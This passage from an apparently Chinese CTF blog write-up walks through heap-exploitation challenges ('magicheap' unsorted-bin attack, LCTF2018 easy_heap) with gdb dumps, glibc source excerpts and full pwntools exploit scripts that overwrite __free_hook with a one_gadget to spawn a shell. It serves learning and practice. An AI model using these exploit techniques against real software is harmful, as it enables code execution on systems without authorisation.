0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0f0:	0x0000000000000000	0x0000000000020f11</span><br><span class="line">0x9ce100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里可以看到magic被修改了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x00000000006020b0+0x10</span><br><span class="line">0x6020c0 &lt;magic&gt;:	0x00007ff41afe4b78	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray&gt;:	0x00000000009ce010	0x00000000009ce040</span><br><span class="line">0x6020f0 &lt;heaparray+16&gt;:	0x00000000009ce0d0	0x0000000000000000</span><br><span class="line">0x602100 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>拿到flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    <span class="string">'flag&#123;unsorted_bin_attack&#125;\n'</span></span><br><span class="line">flag&#123;unsorted_bin_attack&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'magicheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'magicheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"3333"</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    magic = <span class="number">0x00000000006020C0</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"4869"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>unsortbin attack通常用于修改循环次数以及global_max_fast从而任意大小chunk可以fastbin attack</p><p>然后开始学习tcache</p><h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p>我感觉这道题质量挺高的，对于我这个新手来说，他用了挺多内存分配的知识，让我好好补了一波，这道题功能分析以及漏洞点分析请看ctf-wiki tcache篇</p><p>我直接讲解漏洞利用过程</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这道题麻烦就麻烦在没法直接溢出覆盖pre_size，所以要巧妙的构造pre_size，最终在overlap，后面的就是常规操作了</p><p>具体过程是跟ctf-wiki一样<br>具体过程：</p><ol><li>将 A -&gt; B -&gt; C 三块 unsorted bin chunk 依次进行释放</li><li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li><li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li><li>利用 unsorted bin 切分，分配出 A</li><li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li><li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li><li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： A (free) -&gt; B (allocated) -&gt; C (free)，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li><li>tips: 但是在这个过程中需要注意 tcache 的影响。</li></ol><h4 id="堆初始化操作部分"><a href="#堆初始化操作部分" class="headerlink" title="堆初始化操作部分"></a>堆初始化操作部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="堆块重新排列"><a href="#堆块重新排列" class="headerlink" title="堆块重新排列"></a>堆块重新排列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># tcache-0</span></span><br><span class="line"><span class="comment"># tcache-1</span></span><br><span class="line"><span class="comment"># tcache-2</span></span><br><span class="line"><span class="comment"># tcache-3</span></span><br><span class="line"><span class="comment"># tcache-4</span></span><br><span class="line"><span class="comment"># tcache-5</span></span><br><span class="line"><span class="comment"># unsorted - 6</span></span><br><span class="line"><span class="comment"># unsorted - 7</span></span><br><span class="line"><span class="comment"># unsorted - 8</span></span><br><span class="line"><span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-1</span></span><br><span class="line"><span class="comment"># chunk - 7</span></span><br><span class="line"><span class="comment"># chunk - 8</span></span><br><span class="line"><span class="comment"># chunk - 9</span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br></pre></td></tr></table></figure><h4 id="off-by-one覆盖造成overlap"><a href="#off-by-one覆盖造成overlap" class="headerlink" title="off-by-one覆盖造成overlap"></a>off-by-one覆盖造成overlap</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，off-by-one这里要覆盖到inuse的话，是得申请0xf8大小，malloc(0xf8)后，</p><ol><li>它会重用下个堆快的pre_size作为数据块</li><li>所以我们off-by-one才能覆盖到insue位<br>他会在ptr[0xf8]=0;这里就将size处的insue变成0<br>然后此时tcache还没满，所以free(6)让tcache填满后，才能用触发unsortbin合并</li></ol><h4 id="申请0xf8-让剩余的unsortbin对齐到第0块chunk"><a href="#申请0xf8-让剩余的unsortbin对齐到第0块chunk" class="headerlink" title="申请0xf8,让剩余的unsortbin对齐到第0块chunk"></a>申请0xf8,让剩余的unsortbin对齐到第0块chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">puts(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这时候我们puts(0)就可以泄露了，</p><h4 id="后面简单的double-free"><a href="#后面简单的double-free" class="headerlink" title="后面简单的double free"></a>后面简单的double free</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0 chunk-9</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里有个注意的地方，free(1)这里看好</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4194</span>    ------------------------------ <span class="built_in">free</span> ------------------------------</span><br><span class="line"><span class="number">4195</span>  */</span><br><span class="line"><span class="number">4196</span> </span><br><span class="line"><span class="number">4197</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">4198</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line"><span class="number">4199</span> &#123;</span><br><span class="line"><span class="number">4200</span>   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4201</span>   mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line"><span class="number">4202</span>   mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line"><span class="number">4203</span>   INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4204</span>   <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line"><span class="number">4205</span>   INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line"><span class="number">4206</span>   mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4207</span>   mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4208</span> </span><br><span class="line"><span class="number">4209</span>   size = chunksize (p);</span><br><span class="line"><span class="number">4210</span> </span><br><span class="line"><span class="number">4211</span>   <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">4212      allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">4213      Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">4214      here by accident or by "design" from some intruder.  */</span></span><br><span class="line"><span class="number">4215</span>   <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line"><span class="number">4216</span>       || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line"><span class="number">4217</span>     malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"><span class="number">4218</span>   <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">4219      multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="number">4220</span>   <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line"><span class="number">4221</span>     malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"><span class="number">4222</span> </span><br><span class="line"><span class="number">4223</span>   check_inuse_chunk(av, p);</span><br><span class="line"><span class="number">4224</span> </span><br><span class="line"><span class="number">4225</span> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="number">4226</span>   &#123;</span><br><span class="line"><span class="number">4227</span>     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"><span class="number">4228</span> </span><br><span class="line"><span class="number">4229</span>     <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line"><span class="number">4230</span>     tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"><span class="number">4231</span> </span><br><span class="line"><span class="number">4232</span>     <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">4233        trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">4234        2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence</span></span><br><span class="line"><span class="comment">4235        before aborting.  */</span></span><br><span class="line"><span class="number">4236</span>     <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line"><span class="number">4237</span>       &#123;</span><br><span class="line"><span class="number">4238</span>         tcache_entry *tmp;</span><br><span class="line"><span class="number">4239</span>         LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line"><span class="number">4240</span>         <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"><span class="number">4241</span>              tmp;</span><br><span class="line"><span class="number">4242</span>              tmp = tmp-&gt;next)</span><br><span class="line"><span class="number">4243</span>           <span class="keyword">if</span> (tmp == e)</span><br><span class="line"><span class="number">4244</span>             malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line"><span class="number">4245</span>         <span class="comment">/* If we get here, it was a coincidence.  We've wasted a few</span></span><br><span class="line"><span class="comment">4246            cycles, but don't abort.  */</span></span><br><span class="line"><span class="number">4247</span>       &#125;</span><br><span class="line"><span class="number">4248</span> </span><br><span class="line"><span class="number">4249</span>     <span class="keyword">if</span> (tcache</span><br><span class="line"><span class="number">4250</span>         &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line"><span class="number">4251</span>         &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"><span class="number">4252</span>       &#123;</span><br><span class="line"><span class="number">4253</span>         tcache_put (p, tc_idx);</span><br><span class="line"><span class="number">4254</span>         <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4255</span>       &#125;</span><br><span class="line"><span class="number">4256</span>   &#125;</span><br><span class="line"><span class="number">4257</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>源码在最后一部分检查了tcache的数量，所以free的时候得使tcache的数量对的上。</p><p>说多了都是泪，简单题做着不简单，花了好长时间</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#功能性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0x20</span>, <span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># tcache-0</span></span><br><span class="line">    <span class="comment"># tcache-1</span></span><br><span class="line">    <span class="comment"># tcache-2</span></span><br><span class="line">    <span class="comment"># tcache-3</span></span><br><span class="line">    <span class="comment"># tcache-4</span></span><br><span class="line">    <span class="comment"># tcache-5</span></span><br><span class="line">    <span class="comment"># unsorted - 6</span></span><br><span class="line">    <span class="comment"># unsorted - 7</span></span><br><span class="line">    <span class="comment"># unsorted - 8</span></span><br><span class="line">    <span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-1</span></span><br><span class="line">    <span class="comment"># chunk - 7</span></span><br><span class="line">    <span class="comment"># chunk - 8</span></span><br><span class="line">    <span class="comment"># chunk - 9</span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">    malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">    free(<span class="number">6</span>) <span class="comment"># free into 